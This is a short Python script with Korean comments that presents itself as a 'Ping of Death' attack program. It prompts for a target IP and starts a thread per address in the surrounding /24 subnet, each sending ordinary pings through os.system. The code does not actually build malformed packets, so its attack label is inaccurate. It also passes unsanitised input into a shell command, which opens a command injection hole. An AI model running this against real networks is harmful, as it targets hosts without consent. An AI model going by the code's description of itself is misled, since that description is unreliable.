#ping_of_death.py
#죽음의 핑 공격 프로그램


import os
from netaddr import IPNetwork, IPAddress
from socket import *
from threading import Thread

#함수명: sendPing
#입 력: ip
#설 명: 입력받은 ip주소로 핑을 보낸다.
def sendPing(ip):
    try:
        ret=os.system('ping -n 5 %s' %ip)

    except Exception as e:
        print(e)

print('*******[The Ping Of Death]*******')
host=input("공격할 타겟  IP주소 입력>> ")
subnet=host+'/24'
for ip in IPNetwork(subnet):
    t=Thread(target=sendPing, args=(ip,))
    t.start()
